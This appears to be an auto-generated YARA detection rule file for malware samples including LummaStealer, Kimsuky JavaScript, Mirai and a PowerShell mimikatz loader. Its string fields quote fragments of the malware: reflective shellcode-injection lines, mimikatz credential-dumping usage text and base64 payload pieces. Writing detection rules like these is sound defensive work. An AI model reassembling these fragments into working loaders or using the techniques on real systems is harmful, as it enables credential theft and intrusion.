      $x1 = "    $PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAEAAA4fug4AtAnNIbgBTM0hVGhpcy" ascii /* score: '43.00'*/
      $x2 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x3 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x4 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x5 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x6 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x7 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x8 = "http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/" fullword ascii /* score: '36.00'*/
      $x9 = "#If a remote process to inject in to is specified, get a handle to it" fullword ascii /* score: '34.00'*/
      $x10 = "#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory" fullword ascii /* score: '34.00'*/
      $x11 = "Execute mimikatz on two remote computers to dump credentials." fullword ascii /* score: '33.00'*/
      $x12 = "Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection" fullword ascii /* score: '32.00'*/
      $s13 = "$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.00'*/
      $s14 = "$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.00'*/
      $s15 = "Find mimikatz at: http://blog.gentilkiwi.com" fullword ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__026ce5e7482c82368e554338ef80854e_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_026ce5e7482c82368e554338ef80854e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aea278eec7893d863094c9f9177000321ca44dddf03a3b67bbc94d77d144886f"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__8fc3032c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_8fc3032c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fc3032c03dc4f297c0c0b6ffbb43f2c3e66b540ce72a3d752b1844e3613a538"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "AHLN====:::=!!!" fullword ascii /* score: '13.00'*/
      $s4 = ",,,,FFFF!!!#" fullword ascii /* score: '9.00'*/
      $s5 = "EEEt///[!!!G" fullword ascii /* score: '9.00'*/
      $s6 = "#,2\"&)2*((2,)(2*('2('&2'''2&&&3%%%4$$#3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"""#C' */
      $s7 = "!!!!########4444TTTT&&&)" fullword ascii /* score: '9.00'*/
      $s8 = "cccceeeecccc" ascii /* score: '8.00'*/
      $s9 = " ! -***2...2222233330000<<<<{{{{" fullword ascii /* score: '8.00'*/ /* hex encoded string '"""33' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "41979cb6a17c15962a9c3e2835c70fda67182c3a5e2dc81f1b02412399256d63"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__031fa332 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_031fa332.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "031fa332b216162ad975f85c44a7195edba849ff81fa9a15dfdccd37b74bbd85"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s3 = "CLkLoG>" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__0550c780 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_0550c780.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0550c78069d778acf2fe32c87b5898e90de62f08a6b741aefd332e64e68e8c76"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s3 = "4?T2TaCZ!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__5e6e516c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_5e6e516c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5e6e516c43ba268c6ff1bc4dc1b673b6ae53f2415867a64a353dc1ca59118b61"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s3 = "4?T2TaCZ!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__6010fce7 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_6010fce7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6010fce772793e35168d6216a5127bcbbd68829b0d80ea7bb5e7289c0ddd0643"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s3 = "4?T2TaCZ!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__61b0374c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_61b0374c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "61b0374c1c5cb8194b2bba4ca0d8b05417cbc442cfd82ab62e083b13d2ab15ce"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s3 = "4?T2TaCZ!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__0dc12b8f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_0dc12b8f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0dc12b8f2fcc5dd26a83d0700b7f58711511b4ae1b7307c5895742944c467736"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd5fbc9c9b060fefba361d161a5c292f01e501ad32f35199c38db5043a3882c1"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__05080831 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_05080831.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "05080831e0c6951fe3324c1f28b76eaa5c75bf9109e235aa6088e7c18b6fda85"
   strings:
      $s1 = "klogM&8&" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__f3a8635b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_f3a8635b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3a8635be88a0aed49db25d09a35cba557ac7e8f0346421f86206c19f084fc56"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__1ce39e07a979f0e3da342ee46f74268b_imphash__3d7e1914 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_1ce39e07a979f0e3da342ee46f74268b(imphash)_3d7e1914.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d7e1914c68d2a7d0cbbbf8c8a6397326c8507c3e712581dd544b78173e42ee8"
   strings:
      $s1 = "fpcxx.MPN" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__6209bbfe3114af4a5214392d486d765f_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_6209bbfe3114af4a5214392d486d765f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1304cd5e94d2dbc25a28b74cb2bce5c7163997750d75f9cb98aff14b81e03428"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s2 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s5 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s6 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s7 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s8 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s9 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s10 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s11 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule LummaStealer_signature__c4b185fc6a9ca983e00f1684a13ef4e1_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c4b185fc6a9ca983e00f1684a13ef4e1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59c6bad742667e699e758052ea6acd095d75b0242fc1a863fe095fea5ba4364c"
   strings:
      $s1 = "* UMDb" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__c4b185fc6a9ca983e00f1684a13ef4e1_imphash__aa61f405 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c4b185fc6a9ca983e00f1684a13ef4e1(imphash)_aa61f405.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa61f4057d24bd59608a4b05c9d185123a8d13a3679a4312b94fcd7655ac59e4"
   strings:
      $s1 = "* UMDb" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8cd0ffc23a93d40428f4277ead307c71_imphash__7c64f092 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash)_7c64f092.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7c64f09219361dbdeb0b56721782f9a23c6fce297f9eaf25eccffe293d29af74"
   strings:
      $s1 = "$LhjT:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule ISRStealer_signature_ {
   meta:
      description = "_subset_batch - file ISRStealer(signature).z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eed1ba4cf375ff8f2cdc777d4690ad49f364e897e9787d2c55d885d9c4eec553"
   strings:
      $s1 = "Payment-086767.exe" fullword ascii /* score: '19.00'*/
      $s2 = "yllojfe" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Kimsuky_signature__24a42a91 {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_24a42a91.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24a42a912c6ad98ab3910cb1e031edbdf9ed6f452371d5696006c9cf24319147"
   strings:
      $x1 = "try { r0kOoSFyyMi = \"VFZxUUFBTUFBQUFFQUFBQS8vOEFBTGdBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU" ascii /* score: '70.00'*/
      $x2 = "VRUdMenNkRUpHQndlMTRBRDdiQkFrUWtVREJFREZGSS84RklnL2tTY3V3UHRrUWtVVUdMemtTSWRDUmpQQ0I4RHp4K2Z3di93USsyUkF4UlBDQjk4VW0vSlNNaWhPU2M" ascii /* base64 encoded string*/ /* score: '31.00'*/
      $x3 = "6UW9PWDBqeFB5UkhOSTBPUC9FL0VjZzFFY2cxOFQrc3dPMkppeXp4UHpNd1hlZFlJL0UvSmtpbkdUQWE4VDhSRVJFUkVSSHhQNEFRQWI3N0IvRS9FZkQrRVBEKzhEK2l" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $x4 = "RYmdBQkFBQTZDeWhBQUJtRDI4RjVBOERBRVV6OXZNUGYwUWtVRUdMenNkRUpHQndlMTRBRDdiQkFrUWtVREJFREZGSS84RklnL2tTY3V3UHRrUWtVVUdMemtTSWRDUmp" ascii /* base64 encoded string */ /* score: '31.00'*/
      $x5 = "xQVhYWlNZdkk2TUZhQUFDTFZaaEZNOGxGTThCSmk4My8wTEF4eGtRa1lGUkVEN2JZc1RXQThWUkJnUE5VTS8rSVRDUmpORlJFaUZ3a2FMTUdpRVFrWW9EelZFQ0lmQ1J" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $x6 = "TWVBxQVhYWlNZdkk2TUZhQUFDTFZaaEZNOGxGTThCSmk4My8wTEF4eGtRa1lGUkVEN2JZc1RXQThWUkJnUE5VTS8rSVRDUmpORlJFaUZ3a2FMTUdpRVFrWW9EelZFQ0l" ascii /* base64 encoded string */ /* score: '31.00'*/
      $x7 = "wTEF4eGtRa1lGUkVEN2JZc1RXQThWUkJnUE5VTS8rSVRDUmpORlJFaUZ3a2FMTUdpRVFrWW9EelZFQ0lmQ1Jwc2pDSVhDUmhnUEpVUWJBU1FZRHdWSWhVSkdSQnNUMUV" ascii /* base64 encoded string */ /* score: '31.00'*/
      $x8 = "BQkFBQTZDeWhBQUJtRDI4RjVBOERBRVV6OXZNUGYwUWtVRUdMenNkRUpHQndlMTRBRDdiQkFrUWtVREJFREZGSS84RklnL2tTY3V3UHRrUWtVVUdMemtTSWRDUmpQQ0I" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $x9 = "PWDBqeFB5UkhOSTBPUC9FL0VjZzFFY2cxOFQrc3dPMkppeXp4UHpNd1hlZFlJL0UvSmtpbkdUQWE4VDhSRVJFUkVSSHhQNEFRQWI3N0IvRS9FZkQrRVBEKzhEK2lKYlA" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $s10 = "wQVhYWlNZdlA2TkVGQUFCSWkwM1kvOURwR0FJQUFFaUZ5WFFHL3hVYkxnSUFNOERIUmNCYkdEQXlab2xGeTdGYngwWEVMVG9vQUdiSFJjZ01COFpGeWdobVptWVBINFF" ascii /* base64 encoded string */ /* score: '29.00'*/
      $s11 = "0a0syZ3JiQ3R3SzNRcmVDdDhLMEFyaEN1SUs0d3JrQ3VVSzVncm5DdWdLNlFycUN1c0s3QXJ0Q3U0Szd3cmdDdkVLOGdyekN2UUs5UXIyQ3ZjSytBcjVDdm9LK3dyOEN" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s12 = "CdVFDQUFBQVBINEFBQUFBQVJJbVFBUHovLzBHQndvdE1BQUNKRUlIQ1JwWUFBRVNKaUFBRUFBQkJnY0V2SFFBQWliQUFDQUFBZ2U0ekt3QUFpYmdBREFBQWdlL05WQUF" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s13 = "5WFFHL3hVYkxnSUFNOERIUmNCYkdEQXlab2xGeTdGYngwWEVMVG9vQUdiSFJjZ01COFpGeWdobVptWVBINFFBQUFBQUFBTElNRXdGd1VqL3dFaUQrQXR6QmcrMlRjRHI" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s14 = "Fd0ErRUNBRUFBSXRNSkVoSWpSV1NpLzMvSzB3a1RFRzRKZ0FBQUlsTUpFZ1BoVUw4Ly8rTFJDUlFpMHdrUUkwRWdBUEFLOGgwZlkxQi80dUVnamdYQXdDRndBK0V4Z0F" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s15 = "nQUJCdVFDQUFBQVBINEFBQUFBQVJJbVFBUHovLzBHQndvdE1BQUNKRUlIQ1JwWUFBRVNKaUFBRUFBQkJnY0V2SFFBQWliQUFDQUFBZ2U0ekt3QUFpYmdBREFBQWdlL05" ascii /* base64 encoded string  */ /* score: '29.00'*/
   condition:
      uint16(0) == 0x7274 and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__83ff2a6950f98d2f65fd6b1c5c33e68a_imphash__422db641 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_83ff2a6950f98d2f65fd6b1c5c33e68a(imphash)_422db641.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "422db641c3ca5c90d2a9df87e8d761db1b17835f87153312488b5f7e60eccb10"
   strings:
      $s1 = "$LhjT:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Mirai_signature__0db040c2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0db040c2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0db040c20df05321b121b0c7823faeed3fdb1e7e6e3ca3ceb182e32cb38e68ee"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s7 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s15 = "syslogd" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule LummaStealer_signature__2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature).html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc02e6e6c03cb68663f49e42878d318cd58eaa427f2a8eb53e085cc53591eb0c"
   strings:
      $x1 = "      <style>#main-container{padding:0!important}#content{padding:0}.is_new_hnav #content{max-width:none}.is_new_hnav .page-body" ascii /* score: '44.00'*/
      $x2 = "                                                <p class=\"reservation-guest-messaging__privacy-policy-text bui-f-font-caption\"" ascii /* score: '36.00'*/
      $x3 = "      <style>.res-details-app{padding-top:8px}.res-details-app .bui-page-header__title{font-size:24px;font-weight:700;line-heigh" ascii /* score: '32.00'*/
      $s4 = "                                 <div class=ext-footer__links><a href=\"https://www.booking.com/content/about.html?ses=0228718b5" ascii /* score: '28.00'*/
      $s5 = "span>Booking.com receives all messages written here and processes them according to our <a href=\"https://admin.booking.com/hote" ascii /* score: '28.00'*/
      $s6 = "                           <a href=\"https://admin.booking.com/hotel/hoteladmin/index-hotel.html?perform_routing=1&amp;ses=02287" ascii /* score: '27.00'*/
      $s7 = "i0yMC44Miw0Ni45Ni0yMC44MmwtMTMtMjEuNTlMMTEyMS44MSwzNDkuMTF6Ii8+CjwvZz4KPC9zdmc+ alt=\"Booking.com Logo\" class=ext-header__logo>" ascii /* score: '27.00'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string*/ /* reversed goodware string*/ /* score: '26.50'*/
      $s10 = "MS40MzA3TDQyLjQyMDMgOS42MTA3TDM5LjkxMDQgMTEuNDMwN0w0MC44NzAzIDguNDkwN0wzOC4zNjA0IDYuNjcwN0g0MS40NjA0TDQyLjQyMDMgMy43MjA3WiIgZmls" ascii /* base64 encoded string */ /* score: '25.00'*/
      $s11 = "OUg2My40NjAxTDYwLjk1MDEgMjIuOTIwOUw2MS45MTAxIDI1Ljg3MDlMNTkuNDAwMSAyNC4wNTA5TDU2LjkwMDEgMjUuODcwOUw1Ny44NTAxIDIyLjkyMDlMNTUuMzUw" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s12 = "NjAuOTUwMSA1MS43OTA1TDYxLjkxMDEgNTQuNzMwNUw1OS40MDAxIDUyLjkxMDVMNTYuOTAwMSA1NC43MzA1TDU3Ljg1MDEgNTEuNzkwNUw1NS4zNTAxIDQ5Ljk3MDVI" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s13 = "MS40MzA3TDguNDUwMTQgOS42MTA3TDUuOTQwMTQgMTEuNDMwN0w2LjkwMDE0IDguNDkwN0w0LjM5MDE0IDYuNjcwN0g3LjQ5MDE0TDguNDUwMTQgMy43MjA3WiIgZmls" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s14 = " Copyright <a href=\"https://www.booking.com/?lang=xu\" target=_blank class=\"bui-link bui-link--primary\">Booking.com</a> 2025<" ascii /* score: '25.00'*/
      $s15 = "NTEuNzkwNUw5NS44ODAxIDU0LjczMDVMOTMuMzcwMSA1Mi45MTA1TDkwLjg2MDEgNTQuNzMwNUw5MS44MjAxIDUxLjc5MDVMODkuMzEwMSA0OS45NzA1SDkyLjQxMDFM" ascii /* base64 encoded string */ /* score: '25.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__c7a2b1a9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c7a2b1a9.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c7a2b1a98f2c1ef31c930874518814e1a7fd6801e0bd41950a06d2b2796157db"
   strings:
      $x1 = "    $DpoJZwBJmSjvBhp = [Convert]::FromBase64String(\"IIrnSMjcT9nKXFqWyW1OhrG10izcow8YeaQEzGOXYCKfXPPdY0WeDd5cBzRLaxBaW3Ipq5YWE8n" ascii /* score: '76.00'*/
      $x2 = "    $DwcvagEhDgUpJRY  = [Convert]::FromBase64String(\"bdB3SMvcT9nOXFqWNpJOhgm10izcow8YOaQEzGOXYCKfXPPdY0WeDd5cBzRLaxBaW3Ipq5YWE8" ascii /* score: '63.00'*/
      $s3 = "y2LpyTyADx5BxjOFL+Mbro8buPhPHK3JSsd1bchFrA3aPjn16GhVC0iOfGZQ0WE01ezDdUmP/FO0f3CHYjg2Xo1Ebdr7+Dp+fmfNydHFUvFosHYgPmpdrAAwUl7vgu+s" ascii /* score: '21.00'*/
      $s4 = "EP0cGAYLnq3K/sSNpdSfFMo3/WSgDR5zVPXLsBfY/TxRzj22DjDNZ4UTxJ9VD15WbpeyeoCKnAPiqMMQQ+qZ8gGEO9eW5QqZapXjjER/GkWXcUV8Joa/yzI512FxuSea" ascii /* score: '21.00'*/
      $s5 = "QikoY4zafK+G3BiANoXiQH6xxD4rE/bysIbfp0llyXeioYkjomB8XThwvspGBwXn1LlQNTUrL2FrKrDuMP8KM9O4IAvXxdDmGHcEuJ4AVYO445DQ+7+EVro/ymgcpnEj" ascii /* score: '21.00'*/
      $s6 = "F9VPoyIPdoDBCOEVA1tYctIACirAyHY2BIoKENQRFc89QiSqXedpcLJjn2uzaeDSf18IvI6b+UtjFZqUBWWss/cV1702rhDumpl4YS0Khp6lN5V1BFVAoUjZS0hI0WtI" ascii /* score: '21.00'*/
      $s7 = "GT+5auutHcrSj3HMOdsl7qKGrlyvCY7X9E6tdDn3r7RhTC1g55KNqOfL3teZzGdlh9UfTp5KCG2ToixUc/+gTTTi+bz2K+JxH7pm2Az1TvKbEPcDGuHFr38ch1EYenpO" ascii /* score: '21.00'*/
      $s8 = "kU30bmDLlDf/MVGrv/HusZfqN3+wOXCzIRCl0+78BZsmg6rdVaCVmmi4RuO1c2oM6X40FY28ZFfZQUlQJcBJAyu2hThLEV/3VJkW9/aM/bGmlOZwx/ANZhtTABBXRXCk" ascii /* score: '21.00'*/
      $s9 = "IaYUYmOnPo7hxs4Ml/FTPY8nMrUOInR3fTle8Q45YBckiAHffHl7Pf1lvlljZDhN0rMgp0cDUaPl4ILMxhiE4ouVx4NaMPQgawak3lJa2y3gHKT4etd3pPP8qePHz+IG" ascii /* score: '21.00'*/
      $s10 = "KhHRv6WCWP/X9xvVLogbhKUYVEfdlcFmOIW1JlqOuFWa+/nFJQeqT4yrsVWbyWS8iixBXSy/uZRMa4cjyTalST7COjaOVl+hcgS7MeRrznMc+JgqSVso3z5ldLl8hoJa" ascii /* score: '21.00'*/
